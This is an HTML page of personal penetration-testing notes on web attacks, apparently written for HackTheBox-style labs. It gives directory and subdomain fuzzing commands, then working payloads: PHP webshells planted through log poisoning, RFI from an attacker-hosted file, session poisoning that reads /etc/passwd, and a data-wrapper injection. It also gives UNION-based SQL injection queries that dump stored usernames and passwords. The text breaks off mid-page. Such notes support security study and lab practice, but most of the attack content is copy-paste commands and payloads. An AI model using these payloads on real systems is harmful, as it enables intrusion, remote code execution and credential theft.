<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.14">
<link rel="alternate" type="application/rss+xml" href="/the-nest/blog/rss.xml" title="The Nest RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/the-nest/blog/atom.xml" title="The Nest Atom Feed"><title data-react-helmet="true">Web | The Nest</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://crystalwwj.github.io//the-nest/docs/cybersecurity/pentest-notes/foothold/web"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="Web | The Nest"><meta data-react-helmet="true" name="description" content="Great references:"><meta data-react-helmet="true" property="og:description" content="Great references:"><link data-react-helmet="true" rel="icon" href="/the-nest/img/favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://crystalwwj.github.io//the-nest/docs/cybersecurity/pentest-notes/foothold/web"><link data-react-helmet="true" rel="alternate" href="https://crystalwwj.github.io//the-nest/docs/cybersecurity/pentest-notes/foothold/web" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://crystalwwj.github.io//the-nest/docs/cybersecurity/pentest-notes/foothold/web" hreflang="x-default"><link rel="stylesheet" href="/the-nest/assets/css/styles.d9d837ef.css">
<link rel="preload" href="/the-nest/assets/js/runtime~main.3942ce3f.js" as="script">
<link rel="preload" href="/the-nest/assets/js/main.498f1394.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/the-nest/"><div class="navbar__logo"><img src="/the-nest/img/logo.svg" alt="The Nest" class="themedImage_TMUO themedImage--light_4Vu1"><img src="/the-nest/img/logo.svg" alt="The Nest" class="themedImage_TMUO themedImage--dark_uzRr"></div><b class="navbar__title">The Nest</b></a><a class="navbar__item navbar__link navbar__link--active" href="/the-nest/docs/intro">Notes</a><a class="navbar__item navbar__link" href="/the-nest/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/crystalwwj/the-nest/edit/main" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a><div class="toggle_iYfV toggle_2i4l toggleDisabled_xj38"><div class="toggleTrack_t-f2" role="button" tabindex="-1"><div class="toggleTrackCheck_mk7D"><span class="toggleIcon_pHJ9">ðŸŒœ</span></div><div class="toggleTrackX_dm8H"><span class="toggleIcon_pHJ9">ðŸŒž</span></div><div class="toggleTrackThumb_W6To"></div></div><input type="checkbox" class="toggleScreenReader_h9qa" aria-label="Switch between dark and light mode"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_i9tI" type="button"></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/the-nest/docs/intro">Tutorial Intro</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/the-nest/docs/tutorial-basics/create-a-page">Tutorial - Basics</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" href="/the-nest/docs/cybersecurity/pentest-notes/intro">Cybersecurity</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" tabindex="0" href="/the-nest/docs/cybersecurity/pentest-notes/intro">Pentest Notes</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/the-nest/docs/cybersecurity/pentest-notes/intro">Intro</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" tabindex="0" href="/the-nest/docs/cybersecurity/pentest-notes/foothold/discovery-and-enum">Getting Foothold</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/the-nest/docs/cybersecurity/pentest-notes/foothold/discovery-and-enum">Host Discovery and Service Enumeration</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/the-nest/docs/cybersecurity/pentest-notes/foothold/web">Web</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/the-nest/docs/cybersecurity/pentest-notes/foothold/services">Using common services</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/the-nest/docs/cybersecurity/pentest-notes/foothold/smb">SMB, LDAP, Kerberos</a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" tabindex="0" href="/the-nest/docs/cybersecurity/random-notes/intro">Random Notes</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/the-nest/docs/investment/future">investment</a></div></li></ul></nav></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Web</h1></header><p>Great references:</p><ul><li><a href="https://github.com/w181496/Web-CTF-Cheatsheet" target="_blank" rel="noopener noreferrer">Web-CTF-Cheatsheet</a></li><li><a href="https://book.hacktricks.xyz/pentesting-web/" target="_blank" rel="noopener noreferrer">Hacktricks</a></li></ul><h2 class="anchor anchorWithStickyNavbar_y2LR" id="scanning">Scanning<a class="hash-link" href="#scanning" title="Direct link to heading">â€‹</a></h2><p>When given a url, domain, or ip with http port, do some web scanning to find additional endpoints, folders, or whatever potentially accessible paths. </p><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>My tip</h5></div><div class="admonition-content"><p>If you get a 403 on one dir, try enumerating more dirs and files UNDER that 403 dir!</p></div></div><p>Fav wordlists for different purposes:</p><ul><li><code>/usr/share/dirb/wordlists/common.txt</code></li><li><code>/usr/share/wordlists/rockyou.txt</code></li></ul><p>For fast scanning with multiple file extension prefixes, I personally think dirbuster is easier, but I&#x27;m more used to copy-pasting wfuzz commands.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="wfuzz">Wfuzz<a class="hash-link" href="#wfuzz" title="Direct link to heading">â€‹</a></h3><p>Find directory</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -Z --hc </span><span class="token number" style="color:#36acaa">404</span><span class="token plain"> https://ip.htb/FUZZ</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Find files (php)</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">wfuzz -w /usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt --hc </span><span class="token number" style="color:#36acaa">404</span><span class="token plain"> https://laboratory.htb/FUZZ</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Find files (apache)</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">wfuzz -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt -Z --hc </span><span class="token number" style="color:#36acaa">404,500</span><span class="token plain"> http://academy.htb/FUZZ</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Find subdomain</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H </span><span class="token string" style="color:#e3116c">&quot;Host: FUZZ.academy.htb&quot;</span><span class="token plain"> --hc </span><span class="token number" style="color:#36acaa">404,302</span><span class="token plain"> --hw </span><span class="token number" style="color:#36acaa">356</span><span class="token plain"> -t </span><span class="token number" style="color:#36acaa">100</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10.10</span><span class="token plain">.10.215</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u </span><span class="token string" style="color:#e3116c">&#x27;http://target.tld&#x27;</span><span class="token plain"> -H </span><span class="token string" style="color:#e3116c">&quot;Host: FUZZ.target.tld&quot;</span><span class="token plain"> --hw </span><span class="token number" style="color:#36acaa">290</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="other-scanners">Other scanners<a class="hash-link" href="#other-scanners" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">feroxbuster -u https://10.10.10.250:443 -t </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"> -w /usr/share/seclists/Discovery/Web-Content/big.txt -x </span><span class="token string" style="color:#e3116c">&quot;txt,html,php,asp,aspx,jsp&quot;</span><span class="token plain"> -v -k -n -o /home/unicorn011/Desktop/HTB/seal/results/10.10.10.250/scans/tcp_443_https_feroxbuster_big.txt</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h2 class="anchor anchorWithStickyNavbar_y2LR" id="file-inclusion">File inclusion<a class="hash-link" href="#file-inclusion" title="Direct link to heading">â€‹</a></h2><p>If you find a LFI vuln, try application-specific config files such as <code>.env</code>, <code>config.json</code>, <code>composer.json</code> and also check files related to the running process: <code>/proc/self/environ</code>, <code>/proc/self/cwd/&lt;file&gt;</code>, <code>/proc/self/cmdline</code>.</p><p>Some common config locations for both linux and windows, see <a href="https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI" target="_blank" rel="noopener noreferrer">fuzzdb collection</a>.</p><p>Also check out <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#blind-interesting-lfi2rce-files" target="_blank" rel="noopener noreferrer">Hacktricks file inclusion</a></p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="lfirfi-to-rce">LFI/RFI to RCE<a class="hash-link" href="#lfirfi-to-rce" title="Direct link to heading">â€‹</a></h3><p>You can find more webshells in kali under <code>/usr/share/webshells</code></p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="log-contaminating">Log contaminating<a class="hash-link" href="#log-contaminating" title="Direct link to heading">â€‹</a></h3><p>Note: You have to find the location of logs first!!</p><p>Since usually all URLs and requests are logged, we can try to submit a request with PHP code then include the log file. The non-PHP parts will be ignored, and the injected lFI payload will be executed. You can either embed the command in a URL parameter or directly send to port 80:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">$ nc -nv 10.11.0.22 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(UNKNOWN) [10.11.0.22] 80 (http) open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php echo &#x27;&lt;pre&gt;&#x27; . shell_exec($_GET[&#x27;cmd&#x27;]) . &#x27;&lt;/pre&gt;&#x27;;?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HTTP/1.1 400 Bad Request</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>The log will be at the bottom of the <code>access.log</code> file:</p><div class="codeBlockContainer_J+bg language-txt theme-code-block"><div class="codeBlockContent_csEI txt"><pre tabindex="0" class="prism-code language-txt codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">10.11.11.1 - - [30/Dec/2019:13:58:07 -0500] &quot;GET /example.php HTTP/1.1&quot; 200 1189 &quot;http://10.11.11.3/menu.php?file=/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.11.11.1 - - [30/Dec/2019:14:01:41 -0500] &quot;&quot;&lt;?php echo &#x27;&lt;pre&gt;&#x27; . shell_exec($_GET[&#x27;cmd&#x27;]) . &#x27;&lt;/pre&gt;&#x27;;?&gt;\n&quot; 400 981 &quot;-&quot; &quot;-&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Then we can trigger code execution with LFI:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain"># windows</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">http://10.11.11.3/menu.php?file=c:\xampp\apache\logs\access.log&amp;cmd=ipconfig</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># linux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">http://10.11.11.3/menu.php?file=/var/log/apache2/access.log&amp;cmd=ipconfig</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="from-rfi">from RFI<a class="hash-link" href="#from-rfi" title="Direct link to heading">â€‹</a></h3><p>RFI means that the victim server allows fetching remote sources for PHP files, so you can host the script on your computer or domain and instruct the victim to fetch and execute it. This happens when the PHP app is configured with <code>allow_url_include</code> enabled.</p><p>For example, a simple webshell:</p><div class="codeBlockContainer_J+bg language-PHP theme-code-block"><div style="color:#393A34;background-color:#f6f8fa" class="codeBlockTitle_oQzk">evil.php</div><div class="codeBlockContent_csEI PHP"><pre tabindex="0" class="prism-code language-PHP codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>However, you shouldn&#x27;t host the file with a PHP extension because then the file will be executed on the server side (your computer) when it&#x27;s fetched.</p><p>Save the file as a txt since PHP code within a txt file will still get executed when using <code>include()</code>. </p><p>Host the file and fetch with RFI to exploit:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">http://10.11.11.3/menu.php?file=http://&lt;my-ip&gt;/evil.txt&amp;cmd=ls</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>If certain file extensions are blocked or added, you can try:</p><ul><li>adding a null byte to end of string</li><li>add question mark &#x27;?&#x27; to end of RFI payload so that anything added to URL is treated as query string</li></ul><h3 class="anchor anchorWithStickyNavbar_y2LR" id="session-poisoning">Session poisoning<a class="hash-link" href="#session-poisoning" title="Direct link to heading">â€‹</a></h3><p>If the website uses PHP sessions (PHPSESSID in cookie), the sessions are stored in <code>/var/lib/php5/sess_&lt;PHPSESSID&gt;</code>:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user_ip|s:0:&quot;&quot;;loggedin|s:0:&quot;&quot;;lang|s:9:&quot;en_us.php&quot;;win_lin|s:0:&quot;&quot;;user|s:6:&quot;admin&quot;;pass|s:6:&quot;admin&quot;;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>If you set the cookie to PHP code, you might overwrite the data in the session file:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">login=1&amp;user=&lt;?php system(&quot;cat /etc/passwd&quot;);?&gt;&amp;pass=password&amp;lang=menu.php</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Use LFI to include the session file and trogger execution</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">http://10.11.11.3/menu.php?file=/../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="php-wrapper">PHP wrapper<a class="hash-link" href="#php-wrapper" title="Direct link to heading">â€‹</a></h3><p>PHP comes with several wrappers that can be used to bypass checks and sneak data XDDD</p><p>For wrapper tricks, see:</p><ul><li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers" target="_blank" rel="noopener noreferrer">Hacktricks - LFI/RFI using PHP Wrappers</a></li></ul><p>For example, we can use the <code>data</code> wrapper to write an input stream:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">http://10.11.11.3/menu.php?file=data:text/plain,&lt;?php echo system(&quot;ls&quot;) ?&gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h2 class="anchor anchorWithStickyNavbar_y2LR" id="sql-injection">SQL injection<a class="hash-link" href="#sql-injection" title="Direct link to heading">â€‹</a></h2><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>My tip</h5></div><div class="admonition-content"><p>For MSSQL, NO DOUBLE QUOTES! USE DOUBLE SINGLE QUOTES!!</p></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="manual">Manual<a class="hash-link" href="#manual" title="Direct link to heading">â€‹</a></h3><p>Awesome cheatsheets:</p><ul><li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" target="_blank" rel="noopener noreferrer">Pentest Monkey</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer">Payload All the Things</a></li></ul><h4 class="anchor anchorWithStickyNavbar_y2LR" id="mysql">MySQL<a class="hash-link" href="#mysql" title="Direct link to heading">â€‹</a></h4><p>Start with finding number of columns. For example, using union-based select statement + order by until SQL error:</p><div class="codeBlockContainer_J+bg language-SQL theme-code-block"><div class="codeBlockContent_csEI SQL"><pre tabindex="0" class="prism-code language-SQL codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">union select * from price order by 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">union select * from price order by 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Find databases:</p><div class="codeBlockContainer_J+bg language-SQL theme-code-block"><div class="codeBlockContent_csEI SQL"><pre tabindex="0" class="prism-code language-SQL codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">union select 1,group_concat(0x7c,schema_name,0x7c),3,4,5,6,7,8,9 from information_schema.schemata</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Find tables:</p><div class="codeBlockContainer_J+bg language-SQL theme-code-block"><div class="codeBlockContent_csEI SQL"><pre tabindex="0" class="prism-code language-SQL codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">union select 1,group_concat(0x7c,table_name,0x7c),3,4,5,6,7,8,9 fRoM information_schema.tables where table_schema=&quot;web&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Find columns:</p><div class="codeBlockContainer_J+bg language-SQL theme-code-block"><div class="codeBlockContent_csEI SQL"><pre tabindex="0" class="prism-code language-SQL codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">union select 1,group_concat(0x7c,schema_name,0x7c),3,4,5,6,7,8,9 fRoM information_schema.columns where table_name=&quot;backend_users&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Read data:</p><div class="codeBlockContainer_J+bg language-SQL theme-code-block"><div class="codeBlockContent_csEI SQL"><pre tabindex="0" class="prism-code language-SQL codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">union select 1,group_concat(0x7c,username,0x7c),group_concat(0x7c,password,0x7c),4,5,6,7,group_concat(0x7c,description,0x7c),9 fRoM backend_users</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="tools">Tools<a class="hash-link" href="#tools" title="Direct link to heading">â€‹</a></h3><p>Wfuzz</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d </span><span class="token string" style="color:#e3116c">&quot;username=FUZZ&amp;password=ss&quot;</span><span class="token plain"> --hc </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -u http://admin.cronos.htb/index.php</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>SQLmap:</p><ul><li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener noreferrer">official usage tutorial</a></li><li><a href="https://thedarksource.com/sqlmap-cheat-sheet/" target="_blank" rel="noopener noreferrer">cheatsheets</a></li></ul><p>GET</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u </span><span class="token string" style="color:#e3116c">&quot;https://target_site.com/page?p1=value1&amp;p2=value2&quot;</span><span class="token plain"> -p p1</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>POST</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span 